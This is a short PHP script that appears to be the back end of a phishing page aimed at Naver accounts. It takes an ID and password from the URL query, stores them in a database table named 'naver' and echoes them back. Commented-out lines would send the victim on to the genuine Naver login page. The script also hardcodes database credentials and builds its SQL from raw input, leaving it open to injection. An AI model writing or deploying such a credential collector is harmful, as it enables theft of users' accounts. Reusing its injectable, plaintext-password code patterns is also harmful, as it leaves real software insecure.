<?php
$id=$_GET[id];
$pw=$_GET[pw];
$con = mysql_connect("localhost","qrpay","zbdkfvpdl");
if (!$con)
  {
  die('Could not connect: ' . mysql_error());
  }
//echo $query;
mysql_select_db("test", $con);

$sql="INSERT INTO naver (id, pw) VALUES ('".$id."','".$pw."')";
if (!mysql_query($sql,$con))
  {
  die('Error: ' . mysql_error());
  }
echo $id." ".$pw;
echo "<br>1 record added";

//echo "<script>alert(".$id.");</script>";

//echo "<meta http-equiv='refresh' content='0; url=https://nid.naver.com/nidlogin.login' target='_top'>";
//header("Location:https://nid.naver.com/nidlogin.login");
//echo "<script>window.location.replace('https://nid.naver.com/nidlogin.login');<script>";

mysql_close($con)
?>
